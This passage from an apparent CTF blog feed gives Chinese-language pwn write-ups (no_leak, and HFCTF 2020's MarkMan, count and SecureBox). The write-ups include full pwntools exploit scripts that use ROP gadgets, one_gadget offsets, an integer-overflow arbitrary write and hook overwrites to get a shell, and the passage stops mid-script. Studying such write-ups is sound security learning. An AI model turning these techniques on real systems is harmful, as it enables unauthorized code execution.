    <content type="html"><![CDATA[<p>_do_global_dtors_aux中有一个gadgets可以修改stack上的数据，以达到可以代替64位的<code>ret2_dl_runtime_resolve</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@--name:/ctf/work/eonew/noleak<span class="comment"># ROPgadget --binary no_leak | grep rbp</span></span><br><span class="line">0x00000000004004b6 : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004004b5 : add byte ptr [rax], r8b ; pop rbp ; ret</span><br><span class="line">0x0000000000400517 : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x00000000004004a9 : je 0x4004c0 ; pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x00000000004004eb : je 0x400500 ; pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x0000000000400512 : mov byte ptr [rip + 0x200af7], 1 ; pop rbp ; ret</span><br><span class="line">0x00000000004004b3 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004004f5 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x0000000000400515 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x00000000004004ab : pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x00000000004005cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005cf : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004b8 : pop rbp ; ret</span><br></pre></td></tr></table></figure><p><code>0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</code> 这个gadget位于</p><p>_do_global_dtors_aux中 只要控制rbp和edx的值就可以任意修改栈上的数据</p><h2 id="no-leak"><a href="#no-leak" class="headerlink" title="no_leak"></a>no_leak</h2><p>栈溢出，没有可泄露的函数，第一感觉是用<code>ret2_dl_runtime_resolve</code>,但尝试之后发现这道题在伪造调用<code>dl_runtime_resolve</code>的时候会跳转到一个未知的地方，而且溢出的字节有点少。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用思路如下:</p><p>1、栈迁移到bss上</p><p>2、调用libc_start_main，使得bss上残留下原本栈的信息，就会有真实地址在bss上分布</p><p>3、找一个能用的真实地址，利用神奇的gadget，把它伪造成system，再次回跳到main函数</p><p>4、栈溢出构造<code>system(&#39;/bin/sh&#39;)</code></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"no_leak"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'nc.eonew.cn'</span>, <span class="number">10002</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span><span class="params">(gadget1,gadget2,func_got,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>) </span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx </span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi </span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line">gadget_reg = <span class="number">0x4005C6</span> </span><br><span class="line">gadget_call= <span class="number">0x4005B0</span></span><br><span class="line">magic_gadget = <span class="number">0x400518</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005D3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4005D1</span></span><br><span class="line">leave_ret = <span class="number">0x400564</span></span><br><span class="line">buf_address = elf.bss() + <span class="number">0x500</span></span><br><span class="line">fini = <span class="number">0x4005E0</span></span><br><span class="line">init = <span class="number">0x400570</span></span><br><span class="line">start = <span class="number">0x400450</span></span><br><span class="line"><span class="comment">#---------------</span></span><br><span class="line">dbg(<span class="number">0x400537</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'\x00'</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(buf_address) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">8</span></span><br><span class="line">payload += cus_rop(gadget_reg,gadget_call,elf.got[<span class="string">'__libc_start_main'</span>],start,fini,init)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#--------------- </span></span><br><span class="line">pause()</span><br><span class="line">payload  = <span class="string">'\x00'</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(<span class="number">0x4005Ca</span>)</span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFC5EE18</span>) <span class="comment">##(-0x3a11e8)^0xffffffffffffffff+1</span></span><br><span class="line">payload += p64(<span class="number">0x601458</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(magic_gadget)</span><br><span class="line">payload += p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#--------------- </span></span><br><span class="line">binsh = <span class="number">0x6012b0</span></span><br><span class="line">system = <span class="number">0x601458</span></span><br><span class="line">payload =<span class="string">'/bin/sh\x00'</span>+<span class="string">'b'</span>*<span class="number">0x80</span></span><br><span class="line">payload +=cus_rop(gadget_reg,gadget_call,system,binsh,fini,init)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>修改<code>0x601458</code>处的地址，经过加减得到<code>__libc_system</code></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/aux-1.png" class="lozad"></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/aux-2.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;_do_global_dtors_aux中有一个gadgets可以修改stack上的数据，以达到可以代替64位的&lt;code&gt;ret2_dl_runtime_resolve&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;t
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF pwn witeup</title>
    <link href="https://nocbtm.github.io/2020/04/20/HFCTF-pwn-witeup/"/>
    <id>https://nocbtm.github.io/2020/04/20/HFCTF-pwn-witeup/</id>
    <published>2020-04-20T01:31:03.000Z</published>
    <updated>2020-04-24T02:13:47.864Z</updated>
    
    <content type="html"><![CDATA[<p>虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题</p><h2 id="MarkMan"><a href="#MarkMan" class="headerlink" title="MarkMan"></a>MarkMan</h2><p>这个题耗费了太多时间，程序给了puts函数地址,存在一个任意地址写三字节，任意地址尝试了很多地方，刚开始想往stack上写未果，又往<code>dlopen</code>的<code>_dlfcn_hook</code> 上写未果，最终在exit函数会调用<code>_rtld_global</code>结构中的<code>_dl_rtld_lock_recursive</code>或者<code>_dl_rtld_unlock_recursive</code>处改写成功 ，并且因为<code>_dl_rtld_lock_recursive</code>指向的内容距离 <code>libc.address</code>过大，修改后三字节只会有几率成功</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level   = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#p=remote('39.97.210.182',10055)</span></span><br><span class="line">elf=ELF(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc=ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *$rebase(0xcbc)\nb *$rebase(0xcc1)\nb *$rebase(0xd63)\n")</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"target near: 0x"</span>)</span><br><span class="line">leak=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">success(<span class="string">'leak =&gt; &#123;0&#125;'</span>.format(hex(leak)))</span><br><span class="line">success(<span class="string">'libc_address =&gt; &#123;0&#125;'</span>.format(hex(libc.address)))</span><br><span class="line"></span><br><span class="line">dlfcn_hook=libc.address+(<span class="number">0x15555532d0a0</span><span class="number">-0x155554d60000</span>)</span><br><span class="line">dl_rtld_lock_recursive=libc.address+(<span class="number">0x7f8a645fbf60</span><span class="number">-0x7f8a63dde000</span>)</span><br><span class="line">success(<span class="string">'dl_rtld_lock_recursive =&gt; &#123;0&#125;'</span>.format(hex(dl_rtld_lock_recursive)))</span><br><span class="line">success(<span class="string">'dlfcn_hook =&gt; &#123;0&#125;'</span>.format(hex(dlfcn_hook)))</span><br><span class="line">p.sendline(str(int(dl_rtld_lock_recursive)))</span><br><span class="line"></span><br><span class="line">payload=libc.address+one[<span class="number">1</span>]</span><br><span class="line">info(hex(payload))</span><br><span class="line">yi=payload&amp;<span class="number">0xff</span></span><br><span class="line">er=(payload&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">san=(payload&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">info(hex(yi))</span><br><span class="line">info(hex(er))</span><br><span class="line">info(hex(san))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(yi))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(er))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(san))</span><br><span class="line">p.sendline(<span class="string">"cat flag*"</span>)</span><br><span class="line">con=p.recv()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> con:</span><br><span class="line"><span class="keyword">print</span> con</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2><p><code>arm aarch64</code>架构的题,搭建好qemu环境即可调试,题目很简单,不需要本地调试,直接利用IDA F5查看伪C代码即可写EXP<br>200次输入正确结果,利用python里面的eval函数即可自动计算结果,然后通过覆盖目标变量的值即可getshell</p><p>本地运行需要安装所需要的库 ,搜索aarch64的交叉编译的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  sudo apt-cache search aarch64</span><br><span class="line">cpp-5-aarch64-linux-gnu - GNU C preprocessor</span><br><span class="line">cpp-aarch64-linux-gnu - GNU C preprocessor (cpp) <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">g++-5-aarch64-linux-gnu - GNU C++ 编译器</span><br><span class="line">g++-aarch64-linux-gnu - GNU C++ compiler <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">gcc-5-aarch64-linux-gnu - GNU C 编译器</span><br><span class="line">gcc-5-aarch64-linux-gnu-base - GCC, the GNU Compiler Collection (base package)</span><br><span class="line">gcc-aarch64-linux-gnu - GNU C compiler <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">binutils-aarch64-linux-gnu - GNU binary utilities, <span class="keyword">for</span> aarch64-linux-gnu target</span><br><span class="line">qemu-system-arm - QEMU full system emulation binaries (arm)</span><br></pre></td></tr></table></figure><p>安装所需要的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-5-aarch64-linux-gnu gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">'39.97.210.182'</span>,<span class="string">'40285'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line">    <span class="comment">#os.system("gdb -q -ex 'target remote localhost:1234' ")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>) :</span><br><span class="line">p. recvuntil(<span class="string">"~Math: "</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">" = "</span>)[:<span class="number">-3</span>]</span><br><span class="line">answer = eval(data)</span><br><span class="line">p. sendline(str(answer))</span><br><span class="line">payload= <span class="string">'a'</span>*<span class="number">0x64</span>+p64(<span class="number">0x12235612</span>)</span><br><span class="line">p. sendline(payload)</span><br><span class="line">p. interactive()</span><br></pre></td></tr></table></figure><h2 id="SecureBox"><a href="#SecureBox" class="headerlink" title="SecureBox"></a>SecureBox</h2><p>申请空间的函数,在判断size是否大于0xFFF的时候变量强制转化成了int类型,则有整型溢出,又当申请一个很大的空间的时候,由于空间肯定不够,最终不会申请,对应的指针位置为0,则此刻有了一个超大的size,以及指针以0为初始位置,即可实现任意写,最后将接受到的key值逆序与需要写的内容异或,通过enc函数则可往目标地址写上所需写的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LD <span class="keyword">import</span>*</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,sign = <span class="number">0</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line">    <span class="keyword">if</span> sign:</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    p.recvuntil(<span class="string">'Key: \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'ID: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(idx,off,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'ID: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Offset of msg: '</span>,str(off))</span><br><span class="line">    p.sendlineafter(<span class="string">'Len of msg: '</span>,<span class="string">'16'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Msg: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Box ID: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Offset of msg: '</span>,<span class="string">'0'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Len of msg: '</span>,<span class="string">'8'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Msg: \n'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.30.so'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">new(<span class="number">0x500</span>)</span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x500</span>)</span><br><span class="line">leak(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">'LIBC:\t'</span> + hex(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = [<span class="number">0xCB79A</span>,<span class="number">0xCB79D</span>,<span class="number">0xCB7A0</span>,<span class="number">0xE926B</span>, <span class="number">0xE9277</span>]  <span class="comment">#Kali 2.30</span></span><br><span class="line">rce = libc_base + one_gadget[<span class="number">3</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">new(<span class="number">0x7FFFFFFF00000000</span>+<span class="number">0xFF0</span>)</span><br><span class="line">rand_1 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">rand_2 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">randq_1 = <span class="string">''</span></span><br><span class="line">randq_2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-2</span>):</span><br><span class="line">randq_1 += (rand_1[i<span class="number">-1</span>] + rand_1[i])</span><br><span class="line">randq_2 += (rand_2[i<span class="number">-1</span>] + rand_2[i])</span><br><span class="line">rceq = (int(randq_1,<span class="number">16</span>) ^ rce)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">reallocq = (int(randq_2,<span class="number">16</span>) ^ realloc)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span 